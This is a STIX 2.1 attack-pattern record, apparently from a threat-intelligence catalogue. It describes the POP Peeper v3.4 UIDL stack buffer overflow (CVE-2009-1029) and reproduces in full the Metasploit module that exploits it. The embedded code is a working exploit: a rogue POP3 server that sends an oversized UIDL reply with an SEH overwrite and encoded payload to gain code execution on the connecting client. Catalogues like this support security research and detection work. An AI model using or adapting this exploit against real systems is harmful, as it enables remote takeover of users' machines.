{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d78f7819-cd06-4c3e-8222-4906d7f207e0",
    "created": "2024-08-14T16:45:55.204352Z",
    "modified": "2024-08-14T16:45:55.204356Z",
    "name": "POP Peeper v3.4 UIDL Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in POP Peeper v3.4. When a specially crafted UIDL string is sent to a client an attacker may be able to execute arbitrary code. This module is based off of krakowlabs code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/poppeeper_uidl.rb",
            "external_id": "poppeeper_uidl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1029"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'POP Peeper v3.4 UIDL Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in POP Peeper v3.4.\n        When a specially crafted UIDL string is sent to a client,\n        an attacker may be able to execute arbitrary code. This\n        module is based off of krakowlabs code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '53559' ],\n          [ 'CVE', '2009-1029' ],\n          [ 'BID', '33926' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\\x0a\\x20\\x0d\",\n          'StackAdjustment'  => -3500,\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed,\n          'DisableNops' => 'True',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'POP Peeper v3.4',\t{ 'Ret' => 0x10014e39 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-02-27',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The POP daemon port to listen on\", 110 ])\n      ])\n  end\n\n  def on_client_connect(client)\n    ok = \"+OK\\r\\n\"\n    client.put(ok)\n  end\n\n  def on_client_data(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    ok = \"+OK\\r\\n\"\n    client.put(ok)\n\n    client.get_once\n\n    ok = \"+OK\\r\\n\"\n    client.put(ok)\n\n    client.get_once\n\n    ok = \"+OK 1 100\\r\\n\"\n    client.put(ok)\n\n    client.get_once\n\n    sploit = \"+OK\\r\\n1 \" + rand_text_alpha_upper(1072) + generate_seh_payload(target.ret) + \"\\r\\n.\\r\\n\"\n\n    client.put(sploit)\n\n    handler\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-02-27",
    "x_mitre_platforms": [
        "win'"
    ]
}